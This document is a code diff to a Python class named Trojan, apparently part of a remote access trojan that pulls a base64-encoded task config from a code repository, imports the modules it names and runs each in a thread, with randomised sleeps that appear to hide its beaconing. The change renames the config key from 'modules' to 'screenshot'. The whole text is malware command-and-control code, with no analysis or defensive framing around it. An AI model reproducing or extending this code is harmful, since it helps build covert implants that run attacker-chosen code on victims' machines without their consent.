@@ -40,8 +40,8 @@ class Trojan:
         config_json = get_file_contents('config', self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_json))
         for task in config:
-            if task['modules'] not in sys.modules:
-                importlib.import_module(task['modules'])
+            if task['screenshot'] not in sys.modules:
+                importlib.import_module(task['screenshot'])
         return config
     
     def module_runner(self, module):
@@ -59,7 +59,7 @@ class Trojan:
             config = self.get_config()
             print(f"[*] Running tasks: {config}")
             for task in config:
-                thread = threading.Thread(target = self.module_runner, args = (task['modules'],))
+                thread = threading.Thread(target = self.module_runner, args = (task['screenshot'],))
                 thread.start()
                 time.sleep(random.randint(1, 10))
             time.sleep(random.randint(30*60, 3*60*60))
